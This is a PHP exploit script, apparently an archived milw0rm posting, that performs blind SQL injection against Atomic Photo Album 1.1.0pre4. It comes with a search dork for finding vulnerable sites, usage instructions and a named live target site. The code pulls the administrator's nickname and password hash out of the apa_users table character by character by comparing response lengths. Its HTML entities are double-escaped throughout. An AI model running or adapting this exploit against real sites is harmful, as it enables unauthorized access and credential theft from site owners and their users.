&amp;amp;lt;?php
ini_set(&amp;amp;quot;max_execution_time&amp;amp;quot;,0);
print_r(&amp;amp;#039;
###############################################################
#
#      Atomic Photo Album 1.1.0pre4 - Blind SQL Injection Exploit   
#                                                           
#      Vulnerability discovered by: Stack     
#      Exploit coded by:            Stack
#      Greetz to:                   All My Freind
#
###############################################################
#                                                           
#      Dork:        intext:&amp;amp;quot;Powered by Atomic Photo Album 1.1.0pre4&amp;amp;quot;
#      Admin Panel: [Target]/apa/
#      Usage:       php &amp;amp;#039;.$argv[0].&amp;amp;#039; [Target] [Userid]
#      Example for http://www.site.com/apa/lalbum.php?apa_album_ID=[Real id] 2
#      =&amp;amp;gt; php &amp;amp;#039;.$argv[0].&amp;amp;#039; http://www.site.com/apa/album.php?apa_album_ID=2 2
#  Live Demo :
#       http://www.brzi.info/foto/album.php?apa_album_ID=2 1
#                                                           
###############################################################
&amp;amp;#039;);
if ($argc &amp;amp;gt; 1) {
$url = $argv[1];
if ($argc &amp;amp;lt; 3) {
$userid = 1;
} else {
$userid = $argv[2];
}
$r = strlen(file_get_contents($url.&amp;amp;quot;+and+1=1--&amp;amp;quot;));
echo &amp;amp;quot;\nExploiting:\n&amp;amp;quot;;
$w = strlen(file_get_contents($url.&amp;amp;quot;+and+1=0--&amp;amp;quot;));
$t = abs((100-($w/$r*100)));
echo &amp;amp;quot;\nNickname: &amp;amp;quot;;
for ($i=1; $i &amp;amp;lt;= 30; $i++) {
$laenge = strlen(file_get_contents($url.&amp;amp;quot;+and+ascii(substring((select+nickname+from+apa_users+where+id=&amp;amp;quot;.$userid.&amp;amp;quot;+limit+0,1),&amp;amp;quot;.$i.&amp;amp;quot;,1))!=0&amp;amp;quot;));
   if (abs((100-($laenge/$r*100))) &amp;amp;gt; $t-1) {
      $count = $i;
      $i = 30;
   }
}
for ($j = 1; $j &amp;amp;lt; $count; $j++) {
   for ($i = 46; $i &amp;amp;lt;= 122; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url.&amp;amp;quot;+and+ascii(substring((select+nickname+from+apa_users+where+id=&amp;amp;quot;.$userid.&amp;amp;quot;+limit+0,1),&amp;amp;quot;.$j.&amp;amp;quot;,1))%3E&amp;amp;quot;.$i.&amp;amp;quot;&amp;amp;quot;));
      if (abs((100-($laenge/$r*100))) &amp;amp;gt; $t-1) {
         $laenge = strlen(file_get_contents($url.&amp;amp;quot;+and+ascii(substring((select+nickname+from+apa_users+where+id=&amp;amp;quot;.$userid.&amp;amp;quot;+limit+0,1),&amp;amp;quot;.$j.&amp;amp;quot;,1))%3E&amp;amp;quot;.($i-1).&amp;amp;quot;&amp;amp;quot;));
         if (abs((100-($laenge/$r*100))) &amp;amp;gt; $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 122;
      }
   }
}
echo &amp;amp;quot;\nPassword: &amp;amp;quot;;
for ($j = 1; $j &amp;amp;lt;= 32; $j++) {
   for ($i = 46; $i &amp;amp;lt;= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url.&amp;amp;quot;+and+ascii(substring((select+password+from+apa_users+where+id=&amp;amp;quot;.$userid.&amp;amp;quot;+limit+0,1),&amp;amp;quot;.$j.&amp;amp;quot;,1))%3E&amp;amp;quot;.$i.&amp;amp;quot;&amp;amp;quot;));
      if (abs((100-($laenge/$r*100))) &amp;amp;gt; $t-1) {
         $laenge = strlen(file_get_contents($url.&amp;amp;quot;+and+ascii(substring((select+password+from+apa_users+where+id=&amp;amp;quot;.$userid.&amp;amp;quot;+limit+0,1),&amp;amp;quot;.$j.&amp;amp;quot;,1))%3E&amp;amp;quot;.($i-1).&amp;amp;quot;&amp;amp;quot;));
         if (abs((100-($laenge/$r*100))) &amp;amp;gt; $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 102;
      }
   }
}
} else {
echo &amp;amp;quot;\nExploiting failed: By Stack\n&amp;amp;quot;;
}
?&amp;amp;gt;

# milw0rm.com [2008-09-26]